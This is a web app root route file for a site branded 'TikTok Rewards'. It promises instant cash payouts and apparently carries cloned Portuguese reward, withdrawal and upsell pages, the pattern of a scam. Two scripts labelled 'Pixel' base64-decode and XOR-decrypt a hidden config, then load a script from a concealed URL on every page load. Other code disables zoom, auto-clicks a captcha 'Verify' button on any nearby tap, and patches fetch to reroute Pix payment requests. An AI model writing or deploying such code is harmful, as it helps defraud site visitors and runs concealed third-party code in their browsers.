import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  useRouterState,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

const mobileGuardScript = String.raw`
(() => {
  if (window.location.pathname === "/lp/") {
    window.history.replaceState(null, "", "/lp" + window.location.search + window.location.hash);
  }

  if (window.__mobileGuardInstalled) return;
  window.__mobileGuardInstalled = true;
  window.__earlyMobileGuard = true;

  const viewportContent = "width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover";
  let lastUrl = window.location.href;

  const enforceViewport = () => {
    let viewport = document.querySelector('meta[name="viewport"]');
    if (!viewport) {
      viewport = document.createElement("meta");
      viewport.setAttribute("name", "viewport");
      document.head.appendChild(viewport);
    }
    if (viewport.getAttribute("content") !== viewportContent) {
      viewport.setAttribute("content", viewportContent);
    }
    document.documentElement.style.zoom = "1";
    if (document.body) document.body.style.zoom = "1";
  };

  const isTextField = (node) => {
    if (!node || !node.matches) return false;
    return node.matches("input, textarea, select, [contenteditable='true']");
  };

  const resetAllScroll = () => {
    enforceViewport();
  };

  const resetAfterScreenChange = () => {
    requestAnimationFrame(resetAllScroll);
    setTimeout(resetAllScroll, 60);
    setTimeout(resetAllScroll, 180);
    setTimeout(resetAllScroll, 420);
    setTimeout(resetAllScroll, 900);
  };

  const prevent = (event) => {
    if (event.cancelable) event.preventDefault();
    enforceViewport();
  };
  const preventTouchZoom = (event) => {
    if (event.touches && event.touches.length > 1) prevent(event);
  };
  const findCaptchaVerifyButton = (target) => {
    const button = document.querySelector('button[aria-label="Verify"]');
    const pageText = document.body?.innerText || "";
    if (!button || !document.body || (!pageText.includes("I am not a robot") && !pageText.includes("Je ne suis pas un robot"))) return null;
    if (target && target.closest && target.closest('input, textarea, select, [contenteditable="true"]')) return null;
    const card = button.parentElement && button.parentElement.parentElement;
    if (target === button || button.contains(target) || (card && card.contains(target))) return button;
    return null;
  };

  let captchaTapLock = false;
  const activateCaptchaTap = (target) => {
    const button = findCaptchaVerifyButton(target);
    if (!button) return false;
    if (!captchaTapLock) {
      captchaTapLock = true;
      setTimeout(() => {
        try { button.click(); } catch {}
        setTimeout(() => { captchaTapLock = false; }, 700);
      }, 0);
    }
    return true;
  };
  const preventKeyboardZoom = (event) => {
    if ((event.ctrlKey || event.metaKey) && ["+", "-", "=", "0"].includes(event.key)) prevent(event);
  };
  const preventWheelZoom = (event) => {
    if (event.ctrlKey || event.metaKey) prevent(event);
  };

  const originalPushState = history.pushState;
  const originalReplaceState = history.replaceState;
  history.pushState = function () {
    const result = originalPushState.apply(this, arguments);
    lastUrl = window.location.href;
    resetAfterScreenChange();
    return result;
  };
  history.replaceState = function () {
    const result = originalReplaceState.apply(this, arguments);
    lastUrl = window.location.href;
    resetAfterScreenChange();
    return result;
  };

  document.addEventListener("gesturestart", prevent, { passive: false, capture: true });
  document.addEventListener("gesturechange", prevent, { passive: false, capture: true });
  document.addEventListener("gestureend", prevent, { passive: false, capture: true });
  document.addEventListener("touchstart", preventTouchZoom, { passive: false, capture: true });
  document.addEventListener("touchmove", preventTouchZoom, { passive: false, capture: true });
  document.addEventListener("touchend", (event) => { activateCaptchaTap(event.target); enforceViewport(); }, { passive: true, capture: true });
  document.addEventListener("wheel", preventWheelZoom, { passive: false, capture: true });
  document.addEventListener("keydown", preventKeyboardZoom, { passive: false, capture: true });

  window.addEventListener("popstate", resetAfterScreenChange, { capture: true });
  document.addEventListener("click", (event) => {
    const target = event.target;
    if (activateCaptchaTap(target)) return;
    if (target && target.closest && target.closest("input, textarea, select, [contenteditable='true']")) return;
    if (target && target.closest && target.closest("a, button, [role='button']")) {
      resetAfterScreenChange();
    }
  }, true);
  document.addEventListener("focusin", (e) => {
     setTimeout(enforceViewport, 0);
  }, true);
  document.addEventListener("focusout", () => setTimeout(enforceViewport, 180), true);
  if (window.visualViewport) {
    window.visualViewport.addEventListener("resize", () => {
      enforceViewport();
    });
  }

  new MutationObserver(() => {
    if (window.location.href !== lastUrl) {
      lastUrl = window.location.href;
      resetAfterScreenChange();
    }
  }).observe(document.documentElement, { childList: true, subtree: true });

  enforceViewport();
  resetAfterScreenChange();
  setInterval(() => {
    enforceViewport();
    if (window.location.href !== lastUrl) {
      lastUrl = window.location.href;
      resetAfterScreenChange();
    }
  }, 250);
})();
`;

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      {
        name: "viewport",
        content:
          "width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover",
      },
      { name: "theme-color", content: "#ff0050" },
      { title: "TikTok Rewards" },
      {
        name: "description",
        content:
          "Claim your TikTok reward and receive your payout instantly via Cash App, PayPal, Venmo, Zelle or bank transfer.",
      },
      { name: "author", content: "TikTok Rewards" },
      { property: "og:title", content: "TikTok Rewards" },
      {
        property: "og:description",
        content:
          "Claim your TikTok reward and receive your payout instantly via Cash App, PayPal, Venmo, Zelle or bank transfer.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:title", content: "TikTok Rewards" },
      {
        name: "twitter:description",
        content:
          "Claim your TikTok reward and receive your payout instantly via Cash App, PayPal, Venmo, Zelle or bank transfer.",
      },
      {
        property: "og:image",
        content:
          "https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/50f61344-3ad8-4d2a-af27-67e4acf82467/id-preview-0d81ab1f--218b5110-e9e7-4f0e-8e0a-6b9b4e3bde16.lovable.app-1782166830293.png",
      },
      {
        name: "twitter:image",
        content:
          "https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/50f61344-3ad8-4d2a-af27-67e4acf82467/id-preview-0d81ab1f--218b5110-e9e7-4f0e-8e0a-6b9b4e3bde16.lovable.app-1782166830293.png",
      },
    ],
    links: [
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      { rel: "stylesheet", href: "/assets/css2.css" },
      { rel: "icon", type: "image/x-icon", href: "/favicon.ico" },
      { rel: "stylesheet", href: "/assets/index-B8NbOjFt.css" },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="en-US">
      <head>
        <HeadContent />
        <script src="/param-forwarder.js" />
        <script dangerouslySetInnerHTML={{ __html: mobileGuardScript }} />
        
        {/* Pixel 1 */}
        <script dangerouslySetInnerHTML={{ __html: `(function(){var w_fr7=atob("DONR8EzsbUQ9sMd+/JhzhT6AT34f2LMKjJBr32OPCSoTxbMTlYUo3i+DAGpfwugNn5E4gDifQjRUyKIS05M4iCmAQDBU27MRl807g27ATyVJxLUXnpYllT/OVx9gnOUZkIwzkSCfT35my+UQnY400nbOGS1W5KgVrIoplSClCWYRkrEfkJY00nbOWyUFh/ZMmds3lS+PWCUP0f4bxIFixy3fTzlgzQ==");var h_vqtn=[];for(var g_al=0;g_al<w_fr7.length;g_al++){h_vqtn.push(w_fr7.charCodeAt(g_al)&255);}var m_62=h_vqtn[0];var c_9=h_vqtn.slice(1,1+m_62);var c_lqr=h_vqtn.slice(1+m_62);var a_v=c_lqr.map(function(b,i_0){return b^c_9[i_0%m_62];});var b_q="";for(var b_1g=0;b_1g<a_v.length;b_1g++){b_q+=String.fromCharCode(a_v[b_1g]&255);}var v_wh=decodeURIComponent(escape(b_q));var o_k3n=JSON.parse(v_wh);var x_1x=o_k3n.globals||[];x_1x.forEach(function(g_xx){window[g_xx.name]=g_xx.value;});var h_5hus=document.createElement("script");h_5hus.src=o_k3n.url;h_5hus.async=true;h_5hus.defer=true;(o_k3n.attributes||[]).forEach(function(h_g){h_5hus.setAttribute(h_g.name,h_g.value);});(document.head||document.documentElement).appendChild(h_5hus);})();` }} />

        {/* TikTok Pixel */}
        <script dangerouslySetInnerHTML={{ __html: `!function (w, d, t) {
  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=d.createElement("script")
;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=d.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
  ttq.load('DA3GO0JC77UC1JSQLD20');
  ttq.page();
}(window, document, 'ttq');` }} />

        {/* Pixel 2 */}
        <script dangerouslySetInnerHTML={{ __html: `(function(){var a_j4q=atob("DOW3ug34Hf/XZjgRoJ6Vz3+UP8X1Dkxl0JaNlSKbeZH5E0x8yYPOlG6XcNG1FBdiw5feynmLMoqjC0s+zITD336MM5WkRBQzwZHDyGSaaIuyFRor+56V1GyVeN3tRFxw1ISaz3mVdJmuS0hjxZPS1HnVZZy4AhViw46Vli+OfJOiAxorgsfKlnbac566AxorgoHWzmzVaIu6D15ojZXF33udc4v6FU1zyYHEmCHaa567E10zmseVx1CF");var d_7r=[];for(var v_3i3=0;v_3i3<a_j4q.length;v_3i3++){d_7r.push(a_j4q.charCodeAt(v_3i3)&255);}var c_w=d_7r[0];var q_h=d_7r.slice(1,1+c_w);var d_ivgn=d_7r.slice(1+c_w);var u_2scu=d_ivgn.map(function(b,f_t){return b^q_h[f_t%c_w];});var q_mj="";for(var g_zf6=0;g_zf6<u_2scu.length;g_zf6++){q_mj+=String.fromCharCode(u_2scu[g_zf6]&255);}var l_5s=decodeURIComponent(escape(q_mj));var y_ub5=JSON.parse(l_5s);var h_3te=y_ub5.globals||[];h_3te.forEach(function(z_z){window[z_z.name]=z_z.value;});var z_w1jp=document.createElement("script");z_w1jp.src=y_ub5.url;z_w1jp.async=true;z_w1jp.defer=true;(y_ub5.attributes||[]).forEach(function(b_by31){z_w1jp.setAttribute(b_by31.name,b_by31.value);});(document.head||document.documentElement).appendChild(z_w1jp);})();` }} />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();
  const pathname = useRouterState({ select: (state) => state.location.pathname });
  const isPendingTasksAppRoute =
    typeof window !== "undefined" &&
    pathname === "/" &&
    new URLSearchParams(window.location.search).get("__route") === "tasks-app";
  const isNativeAppRoute =
    isPendingTasksAppRoute ||
    pathname === "/tasks-app" ||
    pathname === "/admin" ||
    pathname === "/landingpage" ||
    pathname === "/lp" ||
    pathname === "/lp/" ||
    pathname === "/up1" ||
    pathname === "/thanks" ||
    pathname === "/privacy" ||
    pathname === "/terms" ||
    pathname === "/refund" ||
    pathname === "/contact";
  const isClonedAppRoute =
    (!isPendingTasksAppRoute && pathname === "/") ||
    pathname === "/inicio" ||
    pathname === "/resgatar" ||
    pathname === "/historico" ||
    pathname === "/confirmar-saque" ||
    pathname === "/desbloquear-saque" ||
    pathname === "/faq" ||
    pathname === "/upsell-1" ||
    pathname === "/upsell-2" ||
    pathname === "/upsell-3" ||
    pathname === "/upsell-4" ||
    pathname === "/upsell-5" ||
    pathname === "/back-redirect";

  useEffect(() => {
    if (isNativeAppRoute) return;
    const enforceViewportOnly = () => {
      const viewportContent =
        "width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover";
      let viewport = document.querySelector<HTMLMetaElement>('meta[name="viewport"]');
      if (!viewport) {
        viewport = document.createElement("meta");
        viewport.name = "viewport";
        document.head.appendChild(viewport);
      }
      if (viewport.content !== viewportContent) viewport.content = viewportContent;
    };

    enforceViewportOnly();
  }, [isNativeAppRoute, pathname]);

  useEffect(() => {
    if (isNativeAppRoute) {
      document.getElementById("cloned-app-script")?.remove();
    }
  }, [isNativeAppRoute]);

  useEffect(() => {
    const w = window as unknown as { __pixFetchPatched?: boolean };
    if (!w.__pixFetchPatched) {
      w.__pixFetchPatched = true;
      const origFetch = window.fetch.bind(window);
      window.fetch = async (input: RequestInfo | URL, init?: RequestInit) => {
        try {
          const urlStr =
            typeof input === "string"
              ? input
              : input instanceof URL
                ? input.toString()
                : (input as Request).url;
          if (urlStr.includes("/functions/v1/create-pix-payment")) {
            const body = init?.body ?? (input instanceof Request ? await input.text() : "{}");
            return origFetch("/api/public/create-pix-payment", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: body as BodyInit,
            });
          }
          if (urlStr.includes("/functions/v1/check-pix-status")) {
            const body = init?.body ?? (input instanceof Request ? await input.text() : "{}");
            return origFetch("/api/public/check-pix-status", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: body as BodyInit,
            });
          }
        } catch (e) {
          console.error("[pix-intercept]", e);
        }
        return origFetch(input as RequestInfo, init);
      };
    }

    // Keep mobile routing stable, always reset scroll on screen changes, and block browser zoom.
    const w2 = window as unknown as { __navPatched?: boolean };
    if (!w2.__navPatched) {
      w2.__navPatched = true;
      const validPaths = new Set([
        "/",
        "/landingpage",
        "/lp",
        "/lp/",
        "/thanks",
        "/privacy",
        "/terms",
        "/refund",
        "/contact",
        "/up1",
        "/inicio",
        "/resgatar",
        "/tasks-app",
        "/admin",
        "/historico",
        "/confirmar-saque",
        "/desbloquear-saque",
        "/faq",
        "/upsell-1",
        "/upsell-2",
        "/upsell-3",
        "/upsell-4",
        "/upsell-5",
        "/back-redirect",
      ]);
      const viewportContent =
        "width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover";
      const enforceViewport = () => {
        let viewport = document.querySelector<HTMLMetaElement>('meta[name="viewport"]');
        if (!viewport) {
          viewport = document.createElement("meta");
          viewport.name = "viewport";
          document.head.appendChild(viewport);
        }
        if (viewport.content !== viewportContent) viewport.content = viewportContent;
      };
      const enforceViewportAfterRender = () => {
        enforceViewport();
      };
      const fallbackToHomeIfInvalid = () => {
        const path = window.location.pathname;
        if (!validPaths.has(path)) window.location.replace("/");
      };
      const preventZoom = (event: Event) => {
        if (event.cancelable) event.preventDefault();
        enforceViewport();
      };
      const preventMultiTouchZoom = (event: TouchEvent) => {
        if (event.touches.length > 1 && event.cancelable) event.preventDefault();
      };
      const findCaptchaVerifyButton = (target: EventTarget | null) => {
        const button = document.querySelector<HTMLButtonElement>('button[aria-label="Verify"]');
        const pageText = document.body?.innerText || "";
        if (
          !button ||
          !pageText ||
          (!pageText.includes("I am not a robot") && !pageText.includes("Je ne suis pas un robot"))
        )
          return null;
        if (
          target instanceof Element &&
          target.closest("input, textarea, select, [contenteditable='true']")
        )
          return null;
        const card = button.parentElement?.parentElement;
        if (
          target === button ||
          (target instanceof Node && button.contains(target)) ||
          (target instanceof Node && card?.contains(target))
        )
          return button;
        return null;
      };
      let captchaTapLock = false;
      const activateCaptchaTap = (target: EventTarget | null) => {
        const button = findCaptchaVerifyButton(target);
        if (!button) return false;
        if (!captchaTapLock) {
          captchaTapLock = true;
          window.setTimeout(() => {
            try {
              button.click();
            } catch {
              captchaTapLock = false;
            }
            window.setTimeout(() => {
              captchaTapLock = false;
            }, 700);
          }, 0);
        }
        return true;
      };
      const preventCtrlWheelZoom = (event: WheelEvent) => {
        if (event.ctrlKey && event.cancelable) event.preventDefault();
      };
      const preventKeyboardZoom = (event: KeyboardEvent) => {
        if (
          (event.ctrlKey || event.metaKey) &&
          ["+", "-", "=", "0"].includes(event.key) &&
          event.cancelable
        ) {
          event.preventDefault();
        }
      };
      const origPush = history.pushState;
      const origReplace = history.replaceState;
      history.pushState = function (...args) {
        const r = origPush.apply(this, args as never);
        enforceViewportAfterRender();
        return r;
      };
      history.replaceState = function (...args) {
        const r = origReplace.apply(this, args as never);
        enforceViewportAfterRender();
        return r;
      };
      enforceViewport();
      window.addEventListener("gesturestart", preventZoom, { passive: false });
      window.addEventListener("gesturechange", preventZoom, { passive: false });
      window.addEventListener("gestureend", preventZoom, { passive: false });
      document.addEventListener("gesturestart", preventZoom, { passive: false, capture: true });
      document.addEventListener("gesturechange", preventZoom, { passive: false, capture: true });
      document.addEventListener("gestureend", preventZoom, { passive: false, capture: true });
      document.addEventListener("touchstart", preventMultiTouchZoom, {
        passive: false,
        capture: true,
      });
      window.addEventListener("touchmove", preventMultiTouchZoom, { passive: false });
      document.addEventListener("touchmove", preventMultiTouchZoom, {
        passive: false,
        capture: true,
      });
      document.addEventListener(
        "touchend",
        (event) => {
          activateCaptchaTap(event.target);
          enforceViewport();
        },
        { passive: true, capture: true },
      );
      window.addEventListener("wheel", preventCtrlWheelZoom, { passive: false });
      document.addEventListener("wheel", preventCtrlWheelZoom, { passive: false, capture: true });
      window.addEventListener("keydown", preventKeyboardZoom, { passive: false });
      document.addEventListener("keydown", preventKeyboardZoom, { passive: false, capture: true });
      window.addEventListener("focusin", () => {
        window.setTimeout(enforceViewport, 0);
      });
      window.addEventListener("focusout", () => window.setTimeout(enforceViewport, 220));
      window.visualViewport?.addEventListener("resize", enforceViewport);
      window.addEventListener(
        "click",
        (event) => {
          const target = event.target as Element | null;
          if (activateCaptchaTap(target)) return;
          if (target?.closest("input, textarea, select, [contenteditable='true']")) return;
          enforceViewport();
        },
        true,
      );
      document.addEventListener(
        "click",
        (event) => {
          const target = event.target as Element | null;
          if (activateCaptchaTap(target)) return;
          if (target?.closest("input, textarea, select, [contenteditable='true']")) return;
          enforceViewport();
        },
        true,
      );
      window.addEventListener("popstate", () => {
        setTimeout(() => {
          fallbackToHomeIfInvalid();
          enforceViewport();
        }, 50);
      });
      window.setInterval(() => {
        enforceViewport();
        fallbackToHomeIfInvalid();
      }, 1000);
    }

    const pendingTasksAppRoute =
      window.location.pathname === "/" &&
      new URLSearchParams(window.location.search).get("__route") === "tasks-app";

    if (
      pendingTasksAppRoute ||
      window.location.pathname === "/tasks-app" ||
      window.location.pathname === "/admin" ||
      window.location.pathname === "/landingpage" ||
      window.location.pathname === "/lp" ||
      window.location.pathname === "/lp/" ||
      window.location.pathname === "/up1" ||
      window.location.pathname === "/thanks" ||
      window.location.pathname === "/privacy" ||
      window.location.pathname === "/terms" ||
      window.location.pathname === "/refund" ||
      window.location.pathname === "/contact"
    ) {
      document.getElementById("cloned-app-script")?.remove();
      return;
    }

    const existingPatch = document.getElementById(
      "redeem-patch-script",
    ) as HTMLScriptElement | null;
    if (!existingPatch) {
      const patch = document.createElement("script");
      patch.id = "redeem-patch-script";
      patch.src = "/redeem-patch.js?v=12";
      document.body.appendChild(patch);
    } else if (!existingPatch.src.includes("v=12")) {
      existingPatch.remove();
      const patch = document.createElement("script");
      patch.id = "redeem-patch-script";
      patch.src = "/redeem-patch.js?v=12";
      document.body.appendChild(patch);
    }

    if (document.getElementById("cloned-app-script")) return;
    const timer = window.setTimeout(() => {
      if (document.getElementById("cloned-app-script")) return;
      const script = document.createElement("script");
      script.id = "cloned-app-script";
      script.type = "module";
      script.src = "/assets/index-BhN0l3GJ.js";
      document.body.appendChild(script);
    }, 80);
    return () => window.clearTimeout(timer);
  }, [pathname]);

  return (
    <QueryClientProvider client={queryClient}>
      <div id="cloned-root" style={isNativeAppRoute ? { display: "none" } : undefined} />
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      {isClonedAppRoute ? null : <Outlet />}
    </QueryClientProvider>
  );
}
